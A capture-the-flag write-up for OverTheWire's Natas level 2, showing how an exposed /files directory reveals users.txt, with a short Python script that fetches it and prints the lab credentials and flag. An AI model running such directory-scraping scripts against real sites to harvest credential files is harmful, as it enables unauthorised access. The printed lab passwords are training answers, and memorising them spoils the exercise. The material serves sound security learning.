# Natas Level 2 Writeup (natas2) – OverTheWire

## Overview

This level focuses on information disclosure through exposed directories and files.  
The goal is to find the password for the next level.

## Observation

When we open the website, we see a simple page with no obvious input fields or interaction points.

However, there is a hint on the page:

> **"There is nothing on this page "**

## Finding the Password

### Using Browser
1. Viewing the page source reveals an image reference.  
    ```html
    <img src="files/pixel.png">
    ```
2. Navigating to the `/files` directory, we found two files
    - `pixel.png`  
    - `users.txt` 
3. Accessing the `users.txt` file, we got the password for next level.

#### Proof
```text
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
```
The password is exposed in files.

### Using Python

```python
import requests, re

url = "http://natas2.natas.labs.overthewire.org/"
auth = ("natas2", "TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI")

# step 1: we got /files directory
# response = requests.get(url, auth=auth)
# match = re.search(r'<img(.*?)>', response.text)
# print(match.group(1))  # we got files directory

# step 2: Access /files directory
url += 'files/'
# response = requests.get(url, auth=auth)
# match = re.findall(r"<a(.*?)>", response.text)
# print(match)  # we got pixel.png and users.txt

# step 3: Access users.txt
url += 'users.txt'
response = requests.get(url, auth=auth)
match = re.search(r"natas3:(\w+)", response.text)
print(match.group(1))
```

## Vulnerability

Information disclosure due to publicly accessible directory exposing sensitive files.

## Flag
`3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH`

